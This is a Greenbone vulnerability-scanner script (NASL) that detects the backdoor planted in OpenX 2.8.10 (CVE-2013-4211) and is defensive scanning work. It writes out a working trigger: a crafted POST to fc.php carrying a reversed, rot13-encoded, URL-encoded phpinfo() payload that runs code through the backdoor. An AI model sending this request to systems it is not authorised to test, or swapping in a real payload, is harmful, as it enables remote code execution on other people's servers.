# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:openx:openx";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103755");
  script_cve_id("CVE-2013-4211");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2023-07-27T05:05:08+0000");

  script_name("OpenX 'flowplayer-3.1.1.min.js' Backdoor Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61650");
  script_xref(name:"URL", value:"http://blog.openx.org/08/important-update-for-openx-source-2-8-10-users/");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-02-19 12:48:00 +0000 (Wed, 19 Feb 2020)");
  script_tag(name:"creation_date", value:"2013-08-09 14:28:44 +0200 (Fri, 09 Aug 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("OpenX_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("openx/installed");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code in the
context of the application. Successful attacks will compromise the affected application.");

  script_tag(name:"vuldetect", value:"It was possible to execute 'phpinfo()' by sending a special crafted POST request");

  script_tag(name:"insight", value:"The security issue is caused due to the distribution of a
compromised OpenX Source source code package containing a backdoor.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"OpenX is prone to a backdoor vulnerability.");

  script_tag(name:"affected", value:"OpenX 2.8.10 is vulnerable, other versions may also be affected.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

ex = 'vastPlayer=%3B%29%28bsavcuc'; # phpinfo(); | reverse | rot13 | urlencode
len = strlen(ex);

useragent = http_get_user_agent();
host = http_host_name(port:port);

req = 'POST ' + dir + '/www/delivery/fc.php?file_to_serve=flowplayer/3.1.1/flowplayer-3.1.1.min.js&script=deliveryLog:vastServeVideoPlayer:player HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Content-Length: ' + len + '\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Connection: close\r\n' +
      '\r\n' +
      ex;
result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>phpinfo()" >< result) {
  security_message(port:port);
  exit(0);
}

exit(99);
